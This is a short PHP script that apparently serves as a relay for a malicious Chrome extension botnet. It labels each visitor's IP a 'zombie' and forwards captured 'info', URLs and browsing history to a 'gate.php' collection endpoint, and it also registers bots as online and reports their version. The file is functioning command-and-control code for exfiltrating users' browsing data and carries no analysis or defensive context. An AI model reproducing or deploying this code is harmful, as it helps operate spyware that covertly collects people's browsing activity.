<?php
$z_name = $_SERVER['REMOTE_ADDR'];

$domain = "http://localhost:8080/extensionchrome/";


if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '')
{
    $info = $_GET['info'];
    $url_check = $_GET['url'];
    $url = $domain."gate.php?info=".$info."&url=".$url_check."&zname=".$z_name;
    file_get_contents($url);
}
if(isset($_GET['n']) && $_GET['n'] != '' && isset($_GET['version']) && $_GET['version'] != '')
{
    $url = $domain."gate.php?add=".$z_name."&version=".$_GET['version'];
    file_get_contents($url);
}
if(isset($_GET['history']) && $_GET['history'] != ''){
    $url = $domain."gate.php?history=".$_GET['history']."&zombie=".$z_name;  file_get_contents($url);
}
if(isset($_GET['online']) && $_GET['online'] != ''){
    $url = $domain."gate.php?online=".$z_name;
    file_get_contents($url);
}
?>